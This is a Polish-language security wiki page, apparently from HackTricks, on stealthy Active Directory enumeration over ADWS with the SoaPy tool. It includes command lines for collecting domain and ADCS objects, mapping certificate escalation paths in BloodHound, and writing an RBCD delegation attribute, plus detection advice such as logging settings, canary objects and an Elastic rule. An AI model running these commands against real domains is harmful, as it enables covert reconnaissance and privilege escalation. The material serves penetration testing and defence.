# Enumeracja i cicha kolekcja Active Directory Web Services (ADWS)

{{#include ../../banners/hacktricks-training.md}}

## Czym jest ADWS?

Active Directory Web Services (ADWS) jest **włączone domyślnie na każdym kontrolerze domeny od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Mimo nazwy, **nie jest zaangażowane HTTP**. Zamiast tego, usługa udostępnia dane w stylu LDAP przez zestaw własnych protokołów ramkowych .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany w tych binarnych ramach SOAP i podróżuje przez nietypowy port, **enumeracja przez ADWS jest znacznie mniej prawdopodobna do inspekcji, filtrowania lub podpisywania niż klasyczny ruch LDAP/389 i 636**. Dla operatorów oznacza to:

* Cichsza rekonesans – zespoły niebieskie często koncentrują się na zapytaniach LDAP.
* Wolność zbierania danych z **nie-Windowsowych hostów (Linux, macOS)** przez tunelowanie 9389/TCP przez proxy SOCKS.
* Te same dane, które uzyskałbyś przez LDAP (użytkownicy, grupy, ACL, schemat itp.) oraz możliwość wykonywania **zapisów** (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla **RBCD**).

> UWAGA: ADWS jest również używane przez wiele narzędzi GUI/PowerShell RSAT, więc ruch może się mieszać z legalną aktywnością administracyjną.

## SoaPy – Nattywny klient Python

[SoaPy](https://github.com/logangoins/soapy) jest **pełną re-implementacją stosu protokołów ADWS w czystym Pythonie**. Tworzy ramki NBFX/NBFSE/NNS/NMF bajt po bajcie, umożliwiając zbieranie danych z systemów podobnych do Unix bez dotykania środowiska uruchomieniowego .NET.

### Kluczowe cechy

* Obsługuje **proxy przez SOCKS** (przydatne z implantami C2).
* Szczegółowe filtry wyszukiwania identyczne do LDAP `-q '(objectClass=user)'`.
* Opcjonalne operacje **zapisów** ( `--set` / `--delete` ).
* **Tryb wyjścia BOFHound** do bezpośredniego wchłaniania do BloodHound.
* Flaga `--parse` do upiększania znaczników czasowych / `userAccountControl`, gdy wymagana jest czytelność dla ludzi.

### Instalacja (host operatora)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Poniższy workflow pokazuje, jak enumerować **obiekty domeny i ADCS** przez ADWS, konwertować je na JSON BloodHound i szukać ścieżek ataku opartych na certyfikatach – wszystko z systemu Linux:

1. **Tunel 9389/TCP** z sieci docelowej do twojego komputera (np. za pomocą Chisel, Meterpreter, SSH dynamic port-forward itp.). Eksportuj `export HTTPS_PROXY=socks5://127.0.0.1:1080` lub użyj `--proxyHost/--proxyPort` SoaPy.

2. **Zbierz obiekt domeny głównej:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Zbierz obiekty związane z ADCS z NC konfiguracji:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konwertuj na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Prześlij ZIP** w interfejsie BloodHound i uruchom zapytania cypher, takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, aby ujawnić ścieżki eskalacji certyfikatów (ESC1, ESC8 itp.).

### Pisanie `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Połącz to z `s4u2proxy`/`Rubeus /getticket` dla pełnego **Resource-Based Constrained Delegation** łańcucha.

## Wykrywanie i Wzmocnienie

### Szczegółowe logowanie ADDS

Włącz następujące klucze rejestru na kontrolerach domeny, aby ujawnić kosztowne / nieefektywne wyszukiwania pochodzące z ADWS (i LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Wydarzenia będą się pojawiać pod **Directory-Service** z pełnym filtrem LDAP, nawet gdy zapytanie dotarło przez ADWS.

### Obiekty SACL Canary

1. Utwórz obiekt zastępczy (np. wyłączony użytkownik `CanaryUser`).
2. Dodaj **Audit** ACE dla głównego _Everyone_, audytowanego na **ReadProperty**.
3. Kiedy atakujący wykonuje `(servicePrincipalName=*)`, `(objectClass=user)` itd., DC emituje **Event 4662**, który zawiera prawdziwy SID użytkownika – nawet gdy żądanie jest proxy lub pochodzi z ADWS.

Przykład wstępnie zbudowanej reguły Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|-----|-----------|-------|
| Enumeracja ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, odczyt/zapis |
| Import BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Kompromitacja certyfikatu | [Certipy](https://github.com/ly4k/Certipy) | Może być proxy przez ten sam SOCKS |

## Odniesienia

* [SpecterOps – Upewnij się, że używasz SOAP(y) – Przewodnik operatora po dyskretnym zbieraniu AD za pomocą ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – specyfikacje MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
